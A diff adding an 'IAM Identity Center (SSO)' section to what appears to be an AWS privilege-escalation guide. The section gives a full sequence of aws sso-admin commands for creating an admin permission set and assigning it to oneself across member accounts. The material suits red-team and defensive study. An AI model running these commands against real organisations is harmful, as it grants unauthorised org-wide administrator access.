@@ -134,6 +134,23 @@ aws sts assume-role --role-arn arn:aws:iam::&lt;acct&gt;:role/&lt;role&gt; --rol
           or a self-policy-attach away.
         </blockquote>
 
+        <h2>IAM Identity Center (SSO)</h2>
+        <p>
+          In organisations that have moved off standalone IAM users, <strong>IAM
+          Identity Center</strong> permission sets are the real admin surface and the
+          classic IAM-user edges may not apply. A principal in the management (or a
+          delegated-admin) account that can author and assign permission sets can mint
+          an admin set and grant it to itself in <em>any</em> member account &mdash;
+          org-wide escalation that never touches classic IAM:
+        </p>
+        <pre><code># needs sso:CreatePermissionSet + AttachManagedPolicyToPermissionSet + CreateAccountAssignment
+aws sso-admin list-instances
+aws sso-admin create-permission-set --instance-arn &lt;arn&gt; --name pwn
+aws sso-admin attach-managed-policy-to-permission-set --instance-arn &lt;arn&gt; \
+  --permission-set-arn &lt;ps&gt; --managed-policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+aws sso-admin create-account-assignment --instance-arn &lt;arn&gt; --permission-set-arn &lt;ps&gt; \
+  --target-id &lt;account&gt; --target-type AWS_ACCOUNT --principal-type USER --principal-id &lt;me&gt;</code></pre>
+
         <h2>Lateral movement &amp; data</h2>
         <ul>
           <li><strong>Role assumption chains</strong> &mdash; hop between roles and, via trust policies, into <strong>other accounts</strong> in the organisation.</li>
